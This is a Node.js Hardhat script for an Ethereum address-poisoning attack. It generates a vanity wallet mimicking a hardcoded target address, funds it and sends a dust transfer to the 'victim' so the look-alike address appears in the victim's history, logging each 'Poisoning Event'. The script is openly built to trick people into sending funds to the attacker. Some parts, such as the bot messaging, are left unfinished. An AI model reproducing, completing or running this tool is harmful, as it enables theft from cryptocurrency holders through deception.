require("dotenv/config");
const { ethers, network } = require("hardhat");
const ethereumjs = require("ethereumjs-util");
const crypto = require("crypto");
const chalk = require("chalk");
const util = require("util");
const inquirer = require("inquirer");
const fs = require("fs");
const { cloneTarget } = require("./cloneTarget");

const provider = ethers.provider;

const chain = network.name;

class Logger {
  static logFile = fs.createWriteStream("output.log", { flags: "a" });

  static getCurrentTimestamp() {
    const now = new Date();
    return now.toLocaleTimeString(); // Format: hour:min:secs
  }

  static formatMessage(message) {
    if (typeof message === "string") {
      return message;
    } else {
      // Convert arrays, sets, objects, etc., to a readable string format
      return util.inspect(message, { depth: null, colors: true });
    }
  }

  static writeToFile(level, message) {
    const timestamp = Logger.getCurrentTimestamp();
    const formattedMessage = `[${timestamp}] ${level} ${Logger.formatMessage(
      message
    )}\n`;
    Logger.logFile.write(formattedMessage);
  }

  static log(message) {
    const timestamp = Logger.getCurrentTimestamp();
    const formattedMessage = `[${chalk.magenta(timestamp)}] ${chalk.white(
      Logger.formatMessage(message)
    )}`;
    console.log(formattedMessage);
    Logger.writeToFile("", message); // Log without a level
  }

  static info(message) {
    const timestamp = Logger.getCurrentTimestamp();
    const formattedMessage = `[${chalk.magenta(timestamp)}] ${chalk.blue(
      "INFO:"
    )} ${Logger.formatMessage(message)}`;
    console.log(formattedMessage);
    Logger.writeToFile("INFO:", message);
  }

  static error(message) {
    const timestamp = Logger.getCurrentTimestamp();
    const formattedMessage = `[${chalk.magenta(timestamp)}] ${chalk.red(
      "ERROR:"
    )} ${Logger.formatMessage(message)}`;
    console.error(formattedMessage);
    Logger.writeToFile("ERROR:", message);
  }

  static warning(message) {
    const timestamp = Logger.getCurrentTimestamp();
    const formattedMessage = `[${chalk.magenta(timestamp)}] ${chalk.yellow(
      "WARNING:"
    )} ${Logger.formatMessage(message)}`;
    console.warn(formattedMessage);
    Logger.writeToFile("WARNING:", message);
  }

  static success(message) {
    const timestamp = Logger.getCurrentTimestamp();
    const formattedMessage = `[${chalk.magenta(timestamp)}] ${chalk.green(
      "SUCCESS:"
    )} ${Logger.formatMessage(message)}`;
    console.log(formattedMessage);
    Logger.writeToFile("SUCCESS:", message);
  }
}

async function promptForPrefixAndSuffix() {
  const questions = [
    {
      type: "input",
      name: "prefixLength",
      message: "Enter the prefix length:",
      validate: (input) => {
        const num = parseInt(input);
        if (isNaN(num) || num < 0) {
          return "Please enter a valid non-negative number.";
        }
        return true;
      },
    },
    {
      type: "input",
      name: "suffixLength",
      message: "Enter the suffix length:",
      validate: (input) => {
        const num = parseInt(input);
        if (isNaN(num) || num < 0) {
          return "Please enter a valid non-negative number.";
        }
        return true;
      },
    },
  ];

  const answers = await inquirer.prompt(questions);
  return {
    prefixLength: parseInt(answers.prefixLength, 10),
    suffixLength: parseInt(answers.suffixLength, 10),
  };
}

async function fundWallet(address) {
  const [parentWallet] = await ethers.getSigners();

  // Estimate the gas price
  const feeData = await provider.getFeeData();
  const gasPrice = feeData.gasPrice;

  // Estimate the gas limit for funding the wallet
  const gasLimit = await provider.estimateGas({
    to: address,
    value: ethers.utils.parseEther("0.000001"), // Estimate with 0.000001 ether
  });

  // Calculate the total gas cost
  const gasCost = gasPrice.mul(gasLimit);

  // Add 0.000001 ether to cover the fund transfer
  const totalAmount = gasCost.mul(2).add(ethers.utils.parseEther("0.000001"));

  const transaction = {
    to: address,
    value: totalAmount, // Send gasCost + 0.000001 ether
    gasPrice: gasPrice,
  };

  try {
    const tx = await parentWallet.sendTransaction(transaction);
    await tx.wait();
    Logger.success(`Funded ${address}. Transaction hash: ${tx?.hash}`);
  } catch (error) {
    Logger.error(`Error funding ${address}: ${error}`);
  }
}

async function oneWayTransfer(vanity, to) {
  await fundWallet(vanity.address);

  const vanityWallet = new ethers.Wallet(vanity.privKey, provider);

  // Estimate the gas price
  const feeData = await provider.getFeeData();
  const gasPrice = feeData.gasPrice;

  // Estimate the gas limit for the transfer
  const gasLimit = await provider.estimateGas({
    to: to,
    value: ethers.utils.parseEther("0.000001"), // Estimate with 0.000001 ether
  });

  // Set the transaction details
  const transaction = {
    to,
    value: ethers.utils.parseEther("0.000001"), // Transfer 0.000001 ether
    gasPrice: gasPrice,
    gasLimit: gasLimit, // Use the estimated gas limit
  };

  try {
    const tx = await vanityWallet.sendTransaction(transaction);
    await tx.wait();
    Logger.success(`Transferred to ${to}. Transaction hash: ${tx?.hash}`);

    return tx;
  } catch (error) {
    Logger.error(`Error transferring to ${to}: ${error}`);
  }
}

async function poison(vanity, victim) {
  Logger.info(
    `Poisoning victim ${victim} with vanity address ${vanity.address}`
  );
  const tx = await oneWayTransfer(vanity, victim);
  Logger.success(`Poisoning of ${victim} complete.`);

  const message = `☠️ *Poisoning Event* ☠️
  
  *Transaction Done:*
  
  *TX Hash:* \`${tx?.hash}\`
  
  *Chain Network:* \`${chain}\`
  
  *Victim Address:* \`${victim}\`
  
  *Vanity Wallet Address:* \`${vanity.address}\`
    
  🕒 *Timestamp:* \`${new Date().toLocaleString()}\`
  
  ---
  
  The victim's address has been poisoned with the vanity wallet.`;
}

async function main() {
  const reciever = "0xd6Dda9B8Ba82cBdE494d0da0c46106C9DC4B732a";
  const sender = Logger.success(
    "Bot is running with commands /help, /clones, /poisoned, and /stats."
  );
  Logger.log("Starting main process.");

  // Prompt for prefix and suffix
  const { prefixLength, suffixLength } = await promptForPrefixAndSuffix();

  Logger.info(`Prefix Length: ${prefixLength}`);
  Logger.info(`Suffix Length: ${suffixLength}`);

  cloneTarget(reciever, prefixLength, suffixLength).then((vanity) => {
    poison(vanity, reciever);
  });
}

main();
